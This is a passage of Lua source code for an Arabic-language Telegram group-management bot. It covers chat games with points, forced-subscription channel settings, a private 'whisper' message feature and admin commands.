Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱلٱڵعٱب معطڵة \n❗️🔑 ⌯ ٱرسڵ ( تفعيل الالعاب ) ڵڵعب ', 1, 'md')
else
DevAbs:del(loolIQ..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'الجرس','عقرب الساعه','السمك','المطر','5','الكتاب','البسمار','7','الكعبه','بيت الشعر','لهانه','انا','امي','الابره','الساعه','22','غلط','كم الساعه','البيتنجان','البيض','المرايه','الضوء','الهواء','الضل','العمر','القلم','المشط','الحفره','البحر','الثلج','الاسفنج','الصوت','بلم'};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(loolIQ..'bot:bkbk'..msg.chat_id_,name)
name = string.gsub(name,'الجرس','شيئ اذا لمسته صرخ ما هوه ؟')
name = string.gsub(name,'عقرب الساعه','اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟')
name = string.gsub(name,'السمك','ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟')
name = string.gsub(name,'المطر','شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟')
name = string.gsub(name,'5','ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ')
name = string.gsub(name,'الكتاب','ما الشيئ الذي له اوراق وليس له جذور ؟')
name = string.gsub(name,'البسمار','ما هو الشيئ الذي لا يمشي الا بالضرب ؟')
name = string.gsub(name,'7','عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ')
name = string.gsub(name,'الكعبه','ما هو الشيئ الموجود وسط مكة ؟')
name = string.gsub(name,'بيت الشعر','ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ')
name = string.gsub(name,'لهانه','وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ')
name = string.gsub(name,'انا','ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟')
name = string.gsub(name,'امي','اخت خالك وليست خالتك من تكون ؟ ')
name = string.gsub(name,'الابره','ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ')
name = string.gsub(name,'الساعه','ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟')
name = string.gsub(name,'22','كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ')
name = string.gsub(name,'غلط','ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ')
name = string.gsub(name,'كم الساعه','ما هو السؤال الذي تختلف اجابته دائما ؟')
name = string.gsub(name,'البيتنجان','جسم اسود وقلب ابيض وراس اخظر فما هو ؟')
name = string.gsub(name,'البيض','ماهو الشيئ الذي اسمه على لونه ؟')
name = string.gsub(name,'المرايه','ارى كل شيئ من دون عيون من اكون ؟ ')
name = string.gsub(name,'الضوء','ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟')
name = string.gsub(name,'الهواء','ما هو الشيئ الذي يسير امامك ولا تراه ؟')
name = string.gsub(name,'الضل','ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ')
name = string.gsub(name,'العمر','ما هو الشيء الذي كلما طال قصر ؟ ')
name = string.gsub(name,'القلم','ما هو الشيئ الذي يكتب ولا يقرأ ؟')
name = string.gsub(name,'المشط','له أسنان ولا يعض ما هو ؟ ')
name = string.gsub(name,'الحفره','ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟')
name = string.gsub(name,'البحر','ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟')
name = string.gsub(name,'الثلج','انا ابن الماء فان تركوني في الماء مت فمن انا ؟')
name = string.gsub(name,'الاسفنج','كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟')
name = string.gsub(name,'الصوت','اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟')
name = string.gsub(name,'بلم','حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ')
ABS_PROX = '❗️🚸 ⌯ ٱوڵ وٱحد يحڵهٱ {'..name..'} يربح '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(loolIQ..'bot:bkbk'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(loolIQ..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(loolIQ..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '❗️🚸 ⌯ ڵقد ربحت وحصڵت عڵى نقطة \n❗️🔑 ⌯ ٱرسڵ ( حزوره ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(loolIQ..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'المعاني' or text == 'معاني' then
if not DevAbs:get(loolIQ..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱلٱڵعٱب معطڵة \n❗️🔑 ⌯ ٱرسڵ ( تفعيل الالعاب ) ڵڵعب ', 1, 'md')
else
DevAbs:del(loolIQ..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'قرد','دجاجه','بطريق','ضفدع','بومه','نحله','ديك','جمل','بقره','دولفين','تمساح','قرش','نمر','اخطبوط','سمكه','خفاش','اسد','فأر','ذئب','فراشه','عقرب','زرافه','قنفذ','تفاحه','باذنجان'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(loolIQ..'bot:bkbk2'..msg.chat_id_,name)
name = string.gsub(name,'قرد','🐒')
name = string.gsub(name,'دجاجه','🐔')
name = string.gsub(name,'بطريق','🐧')
name = string.gsub(name,'ضفدع','🐸')
name = string.gsub(name,'بومه','🦉')
name = string.gsub(name,'نحله','🐝')
name = string.gsub(name,'ديك','🐓')
name = string.gsub(name,'جمل','🐫')
name = string.gsub(name,'بقره','🐄')
name = string.gsub(name,'دولفين','🐬')
name = string.gsub(name,'تمساح','🐊')
name = string.gsub(name,'قرش','🦈')
name = string.gsub(name,'نمر','🐅')
name = string.gsub(name,'اخطبوط','🐙')
name = string.gsub(name,'سمكه','🐟')
name = string.gsub(name,'خفاش','🦇')
name = string.gsub(name,'اسد','🦁')
name = string.gsub(name,'فأر','🐭')
name = string.gsub(name,'ذئب','🐺')
name = string.gsub(name,'فراشه','🦋')
name = string.gsub(name,'عقرب','🦂')
name = string.gsub(name,'زرافه','🦒')
name = string.gsub(name,'قنفذ','🦔')
name = string.gsub(name,'تفاحه','🍎')
name = string.gsub(name,'باذنجان','🍆')
ABS_PROX = '❗️🚸 ⌯ مٱ معنى هذٱ ٱڵسمٱيڵ :؟ {'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(loolIQ..'bot:bkbk2'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(loolIQ..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(loolIQ..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '❗️🚸 ⌯ ڵقد ربحت وحصڵت عڵى نقطة \n❗️🔑 ⌯ ٱرسڵ ( المعاني ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(loolIQ..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'العكس' or text == 'عكس' then
if not DevAbs:get(loolIQ..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱلٱڵعٱب معطڵة \n❗️🔑 ⌯ ٱرسڵ ( تفعيل الالعاب ) ڵڵعب ', 1, 'md')
else
DevAbs:del(loolIQ..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'باي','فهمت','موزين','اسمعك','احبك','موحلو','نضيف','حاره','ناصي','جوه','سريع','ونسه','طويل','سمين','ضعيف','شريف','شجاع','رحت','عدل','نشيط','شبعان','موعطشان','خوش ولد','اني','هادئ'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(loolIQ..'bot:bkbk3'..msg.chat_id_,name)
name = string.gsub(name,'باي','هلو')
name = string.gsub(name,'فهمت','مافهمت')
name = string.gsub(name,'موزين','زين')
name = string.gsub(name,'اسمعك','ماسمعك')
name = string.gsub(name,'احبك','ماحبك')
name = string.gsub(name,'محلو','حلو')
name = string.gsub(name,'نضيف','وصخ')
name = string.gsub(name,'حاره','بارده')
name = string.gsub(name,'ناصي','عالي')
name = string.gsub(name,'جوه','فوك')
name = string.gsub(name,'سريع','بطيء')
name = string.gsub(name,'ونسه','ضوجه')
name = string.gsub(name,'طويل','قزم')
name = string.gsub(name,'سمين','ضعيف')
name = string.gsub(name,'ضعيف','قوي')
name = string.gsub(name,'شريف','كواد')
name = string.gsub(name,'شجاع','جبان')
name = string.gsub(name,'رحت','اجيت')
name = string.gsub(name,'حي','ميت')
name = string.gsub(name,'نشيط','كسول')
name = string.gsub(name,'شبعان','جوعان')
name = string.gsub(name,'موعطشان','عطشان')
name = string.gsub(name,'خوش ولد','موخوش ولد')
name = string.gsub(name,'اني','مطي')
name = string.gsub(name,'هادئ','عصبي')
ABS_PROX = '❗️🚸 ⌯ مٱ هو عكس كڵمة {'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(loolIQ..'bot:bkbk3'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(loolIQ..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(loolIQ..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '❗️🚸 ⌯ ڵقد ربحت وحصڵت عڵى نقطة \n❗️🔑 ⌯ ٱرسڵ ( العكس ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(loolIQ..'bot:l:id'..msg.chat_id_,true)
end 
if text == 'المختلف' or text == 'مختلف' then
if not DevAbs:get(loolIQ..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱلٱڵعٱب معطڵة \n❗️🔑 ⌯ ٱرسڵ ( تفعيل الالعاب ) ڵڵعب ', 1, 'md')
else
DevAbs:del(loolIQ..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧜‍♂','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕒','🕤','⌛️','📅',};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(loolIQ..'bot:bkbk4'..msg.chat_id_,name)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
name = string.gsub(name,'🐇','🕊🕊🕊🕊🕊🐇🕊🕊')
name = string.gsub(name,'🌑','🌚🌚🌚🌚🌚🌑🌚🌚')
name = string.gsub(name,'🌚','🌑🌑🌑🌑🌑🌚🌑🌑')
name = string.gsub(name,'⭐️','🌟🌟🌟🌟🌟🌟⭐️🌟')
name = string.gsub(name,'📥','💫💫💫📥💫💫💫💫')
name = string.gsub(name,'⛈','🌨🌨🌨⛈🌨🌨🌨🌨')
name = string.gsub(name,'🌥','⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️')
name = string.gsub(name,'⛄️','☃️☃️☃️☃️⛄️☃️☃️☃️☃️')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀️','🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♀️🧚‍♂️🧚‍♂️')
name = string.gsub(name,'🧚‍♂️','🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♀️🧚‍♂️🧚‍♀️🧚‍♀️')
name = string.gsub(name,'🧝‍♂️','🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♂️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕓','🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📅📆📆')
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
ABS_PROX = '❗️🚸 ⌯ ٱوڵ وٱحد يطڵع ٱڵمختلف يربح\n{'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(loolIQ..'bot:bkbk4'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(loolIQ..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(loolIQ..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '❗️🚸 ⌯ ڵقد ربحت وحصڵت عڵى نقطة \n❗️🔑 ⌯ ٱرسڵ ( المختلف ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(loolIQ..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'امثله' or text == 'الامثله' then
if not DevAbs:get(loolIQ..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱلٱڵعٱب معطڵة \n❗️🔑 ⌯ ٱرسڵ ( تفعيل الالعاب ) ڵڵعب ', 1, 'md')
else
DevAbs2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(loolIQ..'bot:bkbk5'..msg.chat_id_,name)
DevAbs:del(loolIQ..'bot:l:id'..msg.chat_id_)
name = string.gsub(name,'جوز','[ينطي ___ للماعنده سنون]')
name = string.gsub(name,'ضراطه','[الي يسوق المطي يتحمل ___ ]')
name = string.gsub(name,'بيدك','[اكل ___ محد يفيدك]')
name = string.gsub(name,'الحافي','[تجدي من ___ نعال]')
name = string.gsub(name,'شقره','[مع الخيل يا ___ ]')
name = string.gsub(name,'النخله','[الطول طول ___ والعقل عقل الصخلة]')
name = string.gsub(name,'سلايه','[بالوجه امراية وبالظهر ___ ]')
name = string.gsub(name,'الخيل','[من قلة ___ شدو على الچلاب سروج]')
name = string.gsub(name,'حداد','[موكل من صخم وجهه كال آني ___ ]')
name = string.gsub(name,'المبلل','[ ___ ما يخاف من المطر]')
name = string.gsub(name,'الحبل','[اللي تلدغة الحية يخاف من جرة ___ ]')
name = string.gsub(name,'يركص','[المايعرف ___ يكول الكاع عوجه]')
name = string.gsub(name,'العنب','[المايلوح ___ يكول حامض]')
name = string.gsub(name,'العمه','[___ إذا حبت الچنة ابليس يدخل الجنة]')
name = string.gsub(name,'الخبز','[انطي ___ للخباز حتى لو ياكل نصه]')
name = string.gsub(name,'بالحصاد','[اسمة ___ ومنجله مكسور]')
name = string.gsub(name,'شهر','[امشي ___ ولا تعبر نهر]')
name = string.gsub(name,'شكه','[يامن تعب يامن ___ يا من على الحاضر لكة]')
name = string.gsub(name,'القرد','[ ___ بعين امه غزال]')
name = string.gsub(name,'يكحله','[اجه ___ عماها]')
ABS_PROX = '❗️🚸 ⌯ ٱكمڵ ٱڵمثٱڵ ٱڵتٱڵي {'..name..'} '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(loolIQ..'bot:bkbk5'..msg.chat_id_) or 'qssp')..'' then
if not DevAbs:get(loolIQ..'bot:l:id'..msg.chat_id_) then 
DevAbs:incrby(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
DevAbs:del(loolIQ..'bot:bkbk5'..msg.chat_id_)
ABS_PROX = '❗️🚸 ⌯ ڵقد ربحت وحصڵت عڵى نقطة \n❗️🔑 ⌯ ٱرسڵ ( امثله ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end
DevAbs:set(loolIQ..'bot:l:id'..msg.chat_id_,true)
end  
--     Source loolIQ     --
if text == 'الالعاب' or text == 'العاب' then
if not DevAbs:get(loolIQ..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱلٱڵعٱب معطڵة \n❗️🔑 ⌯ ٱرسڵ ( تفعيل الالعاب ) ڵڵعب ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1,[[*
❗️🎒 ⌯ List of games
❗️🎒  ⌯ قائمة الالعاب
〰️➖〰️➖〰️➖〰️➖〰️
❗️🧬 ⌯ ٱرسڵ ⌯» ( حزوره ) للعب
❗️📕 ⌯ ٱرسڵ ⌯» ( امثله ) للعب
❗️🎗 ⌯ ٱرسڵ ⌯» ( ترتيب ) للعب
❗️📯 ⌯ ٱرسڵ ⌯» ( العكس ) للعب
❗️⚜️ ⌯ ٱرسڵ ⌯» ( المعاني ) للعب
❗️📌 ⌯ ٱرسڵ ⌯» ( المختلف ) للعب
❗️🎨 ⌯ ٱرسڵ ⌯» ( سمايلات ) للعب
❗️🔗 ⌯ ٱرسڵ ⌯» ( المحيبس ) للعب
〰️➖〰️➖〰️➖〰️➖〰️
❗️🏵 ⌯ CH ⌯» @loolIQ
*]], 1, 'md')
end
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") and text:match("^ضع عدد النقاط (%d+)$")  then
local abbs1 = { string.match(text, "^(ضع عدد النقاط) (%d+)$")}
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم وضع عدد نقٱط ٱڵبيع \n❗️🔑 ⌯ يمكن ڵڵعضو بيع نقٱط ٱلٱڵعاب \n❗️🎗 ⌯ ٱذٱ كٱنت عدد نقٱطه ٱكثر من(*"..abbs1[2].."*) \n ",1, 'md')
DevAbs:set(loolIQ.."gamepoint" .. msg.chat_id_, abbs1[2])
return false end
--     Source loolIQ     --
if text == 'بيع نقاطي' then
if tonumber((DevAbs:get(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
DevAbs0 = '❗️🚸 ⌯ ڵيس ڵديك نقٱط ٱڵعب ٱولٱ\n❗️🔑 ⌯ ٱرسڵ ( الالعاب ) ڵڵعب'
Dev_Abs(msg.chat_id_, msg.id_, 1,DevAbs0, 1, 'md') 
else
DevAbs0 = (DevAbs:get(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) * tonumber(DevAbs:get('ABS_PROX:'..bot_id..'gamepoint' .. msg.chat_id_)or 50))
DevAbs:incrby('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,DevAbs0)  
DevAbs:del(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_)
DevAbs0 = tonumber((DevAbs:get('ABS_PROX:'..bot_id..'gamepoint' .. msg.chat_id_) or 50))
Dev_Abs(msg.chat_id_, msg.id_, 1,'❗️🚸 ⌯ تـۖم بيع نقٱطك \n❗️🔑 ⌯ كڵ نقطه تسٱوي ('..DevAbs0..') رسٱڵة ', 'md')
end
end
--     Source loolIQ     --
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" or text == "تعيين الاشتراك الاجباري" then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
DevAbs:setex(loolIQ..'DevAbs4'..msg.sender_user_id_,300,true)
Dev_Abs(msg.chat_id_,msg.id_, 1, "*❗️🚸 ⌯ ٱرسڵ ڵي معرف قنٱة ٱلٱشترٱك ٱلٱن*\n", 1 , "md")
end end
if text == "حذف قناة الاشتراك" or text == "حذف قناه الاشتراك" and is_leader(msg) then  
DevAbs:del(loolIQ..'DevAbs3')
text = "❗️🚸 ⌯ تـۖم حذف قنٱة ٱلٱشترٱك ٱلٱجبٱري"
Dev_Abs(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == 'تفعيل الاشتراك الاجباري' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
if not DevAbs:get(loolIQ..'DevAbs3') then
Dev_Abs(msg.chat_id_,msg.id_, 1, "❗️🚸 ⌯ ڵم يتم تعيين قنٱة ٱلٱشترٱك ٱلٱجبٱري \n❗️🔑 ⌯ ٱرسڵ (تعيين قناة الاشتراك) ڵڵتعيين ", 1 , "md")
return false 
end
if DevAbs:get(loolIQ..'DevAbs3') then
Dev_Abs(msg.chat_id_,msg.id_, 1, "❗️☻ تـۖم تـفعيـۧڵ ٱلٱشترٱك ٱلٱجبٱري \n❗️🚸 ⌯ قم برفع ٱڵـبوت ٱدمن في ٱڵقنٱت ", 1 , "md")
DevAbs:set(loolIQ.."DevAbs2", true)
return false end end end
if text == 'تعطيل الاشتراك الاجباري' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
Dev_Abs(msg.chat_id_,msg.id_, 1, "❗️☻ تـۖم تـعطيـۧڵ ٱلٱشترٱك ٱلٱجبٱري", 1 , "md")
DevAbs:del(loolIQ.."DevAbs2")
return false 
end end
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' or text == 'الاشتراك الاجباري' or text == 'قناة الاشتراك الاجباري' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
local DevAbs5 = DevAbs:get(loolIQ.."DevAbs3")
if DevAbs5 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ *قنٱة ٱلٱشترٱك* : ['..DevAbs5..']', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ڵم يتم تعيين قنٱة ٱلٱشترٱك ٱلٱجبٱري \n❗️🔑 ⌯ ٱرسڵ (تعيين قناة الاشتراك) ڵڵتعيين ', 1, 'md')
end end end
--     Source loolIQ     --
local msg = data.message_
text = msg.content_.text_ 
if not DevAbs:get(loolIQ..'TFF'..msg.chat_id_) then
if text and text:match("^اهمس (.*) (.*)") then 
text = text:gsub('@',"")
for_abs = {string.match(text, "اهمس (.*) (.*)")}
function hamss(res1,res2)
if not res2.id_ then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '*❗️📛 ⌯ ٱڵمعرف غير صحيح*', 1, 'html')
return "dx"
end
function hamssss(ress1,ress2)
if (ress2 and ((ress2.status_ and ress2.status_.ID == "ChatMemberStatusLeft") or ress2.ID == "Error")) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📛 ⌯ ٱڵعضو غير موجود في ٱڵمجـمۄعة', 1, 'html')
return "dx"
end
tdcli_function ({
ID="DeleteMessages",
chat_id_= msg.chat_id_,
message_ids_= {[0] = msg.id_}
}, 
dl_cb, nil)
DevAbs:set(loolIQ.."HM:"..msg.chat_id_..msg.id_..res2.id_,for_abs[1])
function bot_id_get(ros1,ros2)
bot_username = (ros2.username_ or "DEVIRAQ_BOT")
function Dxx(ross1,ross2)
local hms = msg.sender_user_id_
if ross2.username_ then 
hms = "@"..ross2.username_
end
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تم صنع همسه ٱڵى : @["..for_abs[2].."] \n❗️🔑 ⌯ تم ٱرسٱڵهٱ من ⌯» ["..hms.."] \n❗️🎗 ⌯ هو فقط من يستطيع رؤيتهٱ \n❗️📣 ⌯ [ٱضغط هنٱ ڵعرض ٱڵهمسه](https://t.me/"..bot_username.."?start=hms"..msg.chat_id_..msg.id_.."_"..res2.id_..")\n", 1, 'md')
end
getUser(msg.sender_user_id_, Dxx)
end
getUser(bot_id, bot_id_get)
end
tdcli_function ({
ID = "GetChatMember",
chat_id_ = msg.chat_id_,
user_id_ = res2.id_
}, hamssss, nil)
end
resolve_username(for_abs[2],hamss) 
end
end
if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" then  
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تستطيع ٱرسٱڵ ٱڵهمسه بسريه تٱمه ٱڵى ٱلٱعضٱء عن طريق بوت ٱڵحمٱيه \n❗️🔑 ⌯ ٱستخدم ٱلٱمر كٱلٱتي ⌯» ⤈ \n( اهمس + الهمسه + المعرف )\n❗️🔅 ⌯ مثٱڵ ٱوضح ⌯» ⤈ \n( اهمس مرحبا @[IQ_ABS] )', 1, 'md')
end
if text and text:match("/start hms(.*)_(%d+)") then 
for_abs = {string.match(text, "^/start hms(.*)_(%d+)")}
if tonumber(msg.sender_user_id_) == tonumber(for_abs[2]) then 
AbsProx = DevAbs:get(loolIQ.."HM:"..for_abs[1]..for_abs[2])
if AbsProx then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️📣 ⌯ ٱڵهمسه ٱڵموجهٱ ڵك هي ⌯» ⤈\n( ['..AbsProx..'] )', 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱخي ٱڵهمسه ڵيست ڵك', 1, 'md')
end 
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱخي ٱڵهمسه ڵيست ڵك', 1, 'md')
end
end  
--     Source loolIQ     --
if text == 'رفع المشرفين' then  
local function promote_admin(extra, result, success)  
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
DevAbs:sadd(loolIQ..'abs:admins'..msg.chat_id_, admins[i].user_id_)   
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  
owner_id = admins[i].user_id_  
DevAbs:sadd(loolIQ..'abs:monsh:'..msg.chat_id_,owner_id)   
end  
end  
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ تـۖم رفع ('..num..') ٱدمنية هنٱ \n❗️🔑 ⌯ تـۖم رفع منشئ ٱڵمجموعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» ('..msg.sender_user_id_..')', 1, 'md')
end
getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
end
--     Source loolIQ     --
if is_sudo3(msg.sender_user_id_, msg.chat_id_) then
name_bot = (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس')
if text ==  ""..name_bot..' غادر' then
chat_leave(msg.chat_id_, bot_id)
DevAbs:srem(loolIQ.."bot:groups",msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم مغٱدرة ٱڵمجموعة \n❗️🔑 ⌯ تـۖم حذف جميع بيٱنٱتهٱ ', 1, 'md')
end
end
--     Source loolIQ     --
if text ==('موقعي')  then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'ٱڵـۧمـۧنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'ٱلٱدمـۧن'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'عضو'
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ موقعک ⌯» '..rtpa..'', 1, 'md')
end,nil)
end
--     Source loolIQ     --
